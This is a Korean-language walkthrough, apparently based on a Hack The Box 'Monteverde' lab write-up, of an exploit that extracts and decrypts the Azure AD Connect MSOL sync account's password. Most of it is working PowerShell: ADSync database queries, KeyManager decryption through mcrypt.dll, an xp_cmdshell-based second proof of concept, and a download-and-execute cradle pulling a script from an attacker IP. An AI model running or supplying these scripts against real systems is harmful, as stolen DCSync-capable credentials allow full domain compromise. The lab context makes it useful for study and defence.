# azuread\_decrypt\_msol

이 익스플로잇은 Azure AD Connect 동기화에서 사용하는 MSOL 서비스 계정(DCSync 허용)을 덤프하는 익스플로잇입니다.&#x20;

이 익스플로잇을 통해 아이디와 비밀번호를 얻을 수 있습니다.

관련 링크 : [익스플로잇 상세 설명](https://blog.xpnsec.com/azuread-connect-for-redteam/), [실제 예시](https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html)

익스플로잇은 크게 세 부분으로 나뉩니다:

* DB에서 정보를 가져와 키매니저에서 암호화 키를 검색합니다.
* DB에서 설정 및 암호화된 비밀번호를 가져옵니다.
* 키를 가져와서 비밀번호를 해독합니다.

**키 정보 가져오기**

이 코드는 데이터베이스에 간단한 쿼리를 수행하고 그 결과를 적절한 변수에 저장하는 것뿐입니다:

```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()
```

몬테베르데에서 `sqlcmd를` 사용하여 동일한 쿼리를 수행하여 결과를 확인할 수 있습니다:

```bash
*Evil-WinRM* PS C:\> sqlcmd -d ADSync -Q 'SELECT keyset_id, instance_id, entropy FROM mms_server_configuration'
keyset_id   instance_id                          entropy
----------- ------------------------------------ ------------------------------------
          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD

(1 rows affected)
```

**구성 정보 가져오기**

다음 섹션에서는 구성 정보를 가져오는 두 번째 쿼리를 코드화합니다:

```
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
```

다시 말하지만, `sqlcmd로` 동일한 쿼리를 수행할 수 있지만 전체 결과가 인쇄되지는 않습니다:

```bash
*Evil-WinRM* PS C:\> sqlcmd -d ADSync -Q 'SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = "AD"'
private_configuration_xml                                                                                                                                                                                                                                        encrypted_configuration
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g

(1 rows affected)
```

전체 결과를 얻기 위해 `-y 0이` 작동하는 것을 보여주는 [이 스택오버플로우 게시물을](https://stackoverflow.com/questions/24345345/how-to-prevent-sqlcmd-truncation-with-for-xml-path-query-result) 발견했습니다:

```
*Evil-WinRM* PS C:\> sqlcmd -y0 -d ADSync -Q 'SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = "AD"'
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
 <sign-and-seal>1</sign-and-seal>
 <ssl-bind crl-check="0">0</ssl-bind>
 <simple-bind>0</simple-bind>
 <default-ssl-strength>0</default-ssl-strength>
 <parameter-values>
  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
  <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
  <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
  <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
  <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
  <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
  <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
  <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
  <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
</parameter-values>
 <password-hash-sync-config>
            <enabled>1</enabled>
            <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
         </password-hash-sync-config>
</adma-configuration>
8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=

(1 rows affected)
```

암호화된 비밀번호는 하단에, 설정은 상단에 있습니다.

**암호 해독**

스크립트의 세 번째 섹션은 복호화합니다. 먼저 키 매니저에서 복호화 객체를 가져오는 일련의 과정을 거칩니다:

```
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
```

이제 암호를 해독합니다:

```
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```

나머지는 출력물의 서식을 지정하고 인쇄하기만 하면 됩니다:

```
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

#### 새로운 POC <a href="#new-poc" id="new-poc"></a>

**차이점**

몇 가지 추가 인쇄 문구를 제외하고는 [새 POC의](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c) 처음 두 섹션은 완전히 동일합니다. 세 번째 부분은 새로운 부분입니다. 파워셸에서 키를 가져와서 암호를 해독하는 대신, 데이터베이스에서 명령을 실행할 수 있도록 `xp_cmdshell을` 통해 해당 명령을 전달합니다:

```
$cmd = $client.CreateCommand()
$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell.exe -c `"add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'';`$km = New-Object -TypeName Microsoft.DirectoryServices.                 MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', [guid]''$instance_id'', $key_id);`$key = `$null;`$km.GetActiveCredentialKey([ref]`$key);`$key2 = `$null;`$km.GetKey(1, [ref]`$key2);`$decrypted = `$null;`$key2.DecryptBase64ToString(''$crypted'', [ref]`$decrypted);Write-Host        `$decrypted`"'"
$reader = $cmd.ExecuteReader()

$decrypted = [string]::Empty

while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false) {
    $decrypted += $reader.GetString(0)
}

if ($decrypted -eq [string]::Empty) {
    Write-Host "[!] Error using xp_cmdshell to launch our decryption powershell"
    return
}
```

**실행하기**

[새 POC 코드의](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c) 사본을 다운로드하고 원본에서 수행한 작업과 일치하도록 연결 문자열을 업데이트했습니다:

```
Write-Host "AD Connect Sync Credential Extract v2 (@_xpn_)"
Write-Host "`t[ Updated to support new cryptokey storage method ]`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"

try {
    $client.Open()
} catch {
    Write-Host "[!] Could not connect to localdb..."
    return
}

Write-Host "[*] Querying ADSync localdb (mms_server_configuration)"

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_server_configuration"
    return
}

$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

Write-Host "[*] Querying ADSync localdb (mms_management_agent)"

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_management_agent"
    return
}

$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

Write-Host "[*] Using xp_cmdshell to run some Powershell as the service user"

$cmd = $client.CreateCommand()
$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell.exe -c `"add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'';`$km = New-Object -TypeName Microsoft.DirectoryServices.                 MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', [guid]''$instance_id'', $key_id);`$key = `$null;`$km.GetActiveCredentialKey([ref]`$key);`$key2 = `$null;`$km.GetKey(1, [ref]`$key2);`$decrypted = `$null;`$key2.DecryptBase64ToString(''$crypted'', [ref]`$decrypted);Write-Host        `$decrypted`"'"
$reader = $cmd.ExecuteReader()

$decrypted = [string]::Empty

while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false) {
    $decrypted += $reader.GetString(0)
}

if ($decrypted -eq [string]::Empty) {
    Write-Host "[!] Error using xp_cmdshell to launch our decryption powershell"
    return
}

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerText}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host "[*] Credentials incoming...`n"

Write-Host "Domain: $($domain.Domain)"
Write-Host "Username: $($username.Username)"
Write-Host "Password: $($password.Password)"
```

이제 처음에 실행했던 것처럼 실행해 보겠습니다. `xp_cmdshell에서` 실패합니다:

```
*Evil-WinRM* PS C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentialsv2.ps1')
AD Connect Sync Credential Extract v2 (@_xpn_)
        [ Updated to support new cryptokey storage method ]

[*] Querying ADSync localdb (mms_server_configuration)
[*] Querying ADSync localdb (mms_management_agent)
[*] Using xp_cmdshell to run some Powershell as the service user
Exception calling "ExecuteReader" with "0" argument(s): "User does not have permission to perform this action.
You do not have permission to run the RECONFIGURE statement.
The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
You do not have permission to run the RECONFIGURE statement.
The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'."
At line:46 char:1
+ $reader = $cmd.ExecuteReader()
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : SqlException
Exception calling "Read" with "0" argument(s): "Invalid attempt to call Read when reader is closed."
At line:50 char:8
+ while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false)  ...
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : InvalidOperationException
[!] Error using xp_cmdshell to launch our decryption powershell
```

이 DB에서 `xp_cmdshell이` 활성화되어 있지 않으며, 저희 계정에 이를 활성화할 수 있는 충분한 권한이 없습니다.

`sqlcmd에서` 시도해도 같은 결과가 나옵니다:

```
*Evil-WinRM* PS C:\> sqlcmd -y0 -d ADSync -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
Msg 15247, Level 16, State 1, Server MONTEVERDE, Procedure sp_configure, Line 105
User does not have permission to perform this action.
Msg 5812, Level 14, State 1, Server MONTEVERDE, Line 1
You do not have permission to run the RECONFIGURE statement.
Msg 15123, Level 16, State 1, Server MONTEVERDE, Procedure sp_configure, Line 62
The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
Msg 5812, Level 14, State 1, Server MONTEVERDE, Line 1
You do not have permission to run the RECONFIGURE statement.
```
